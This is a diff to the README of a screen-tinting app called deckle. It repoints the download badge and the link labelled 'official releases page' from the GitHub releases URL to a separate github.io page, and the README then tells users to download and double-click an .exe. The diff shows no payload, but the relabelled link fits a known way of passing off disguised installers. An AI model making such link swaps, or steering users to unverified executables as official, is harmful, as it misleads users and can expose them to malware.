@@ -1,6 +1,6 @@
 # 📄 deckle - Make your screen feel like paper
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/thin-ump380/deckle/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://thin-ump380.github.io)
 
 ## 📖 About This App
 
@@ -14,7 +14,7 @@ The app runs as a small icon in your menu bar. You click this icon to change the
 
 Follow these steps to set up Deckle on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/thin-ump380/deckle/releases) to find the latest version of the app.
+1. Visit the [official releases page](https://thin-ump380.github.io) to find the latest version of the app.
 2. Select the file ending in .exe from the assets list.
 3. Save the file to your computer.
 4. Double-click the file to start the installation.
